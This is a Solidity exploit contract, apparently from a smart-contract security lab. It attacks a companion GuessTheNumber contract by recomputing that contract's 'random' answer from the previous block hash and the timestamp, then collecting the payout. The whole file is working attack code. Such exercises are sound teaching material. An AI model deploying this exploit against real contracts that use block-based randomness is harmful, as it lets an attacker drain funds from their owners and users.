// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {GuessTheNumber} from "./InsecureRandomNumber.sol";

contract Attack {
    GuessTheNumber public guessRandomNumber;

    receive() external payable {}

    constructor(address _guessRandomNumber) {
        guessRandomNumber = GuessTheNumber(_guessRandomNumber);
    }

    function attack() public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        guessRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
